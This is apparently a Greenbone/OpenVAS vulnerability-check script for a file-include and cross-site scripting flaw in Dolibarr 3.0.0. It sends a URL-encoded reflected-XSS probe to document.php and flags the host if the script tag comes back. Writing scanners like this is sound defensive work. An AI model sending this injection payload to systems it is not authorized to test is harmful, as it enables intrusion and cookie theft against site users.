CPE = "cpe:/a:dolibarr:dolibarr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103144" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_bugtraq_id( 47542 );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-04-29 15:04:36 +0200 (Fri, 29 Apr 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_name( "Dolibarr Local File Include and Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_dolibarr_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "dolibarr/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/47542" );
	script_xref( name: "URL", value: "http://www.dolibarr.org/downloads/cat_view/62-stables-versions" );
	script_tag( name: "impact", value: "An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute local files within
  the context of the affected application. Information harvested may
  aid in further attacks.

  The attacker may leverage the cross-site scripting issues to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal cookie-
  based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "Dolibarr 3.0.0 is vulnerable. Other versions may also be affected." );
	script_tag( name: "summary", value: "Dolibarr is prone to a local file-include vulnerability and a cross-
  site scripting vulnerability because it fails to properly sanitize user-supplied input." );
	script_tag( name: "solution", value: "Upgrade to the latest version." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/document.php?lang=%22%3E%3Cscript%3Ealert%28%27vt-xss-test%27%29%3C/script%3E";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\('vt-xss-test'\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

